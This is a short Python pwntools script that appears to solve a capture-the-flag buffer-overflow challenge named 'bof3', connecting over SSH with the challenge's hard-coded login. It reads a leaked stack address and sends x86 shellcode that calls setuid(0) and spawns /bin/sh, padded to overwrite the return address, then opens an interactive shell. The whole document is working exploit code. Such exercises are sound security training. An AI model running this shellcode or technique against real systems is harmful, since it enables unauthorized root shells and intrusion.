#! /usr/bin/env python3
import pwn
 
s = pwn.ssh('pwn3r', 'challenges.hackademint.org', password='pwn3r',port=32428)
 
p = s.process('bof3')

#recupere l'adresse leak du buffer 
p.recvuntil(': ', drop=True)
leak = int(p.recvuntil('\n', drop=True),16) #str->int
print(leak)

shellcode = b"\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"
#62 = taille padding -> segfault (cf gdb autre term)
p.sendline(shellcode + b'A'*int(62-len(shellcode)) + pwn.p32(leak)) 
p.interactive()
p.close()
s.close()
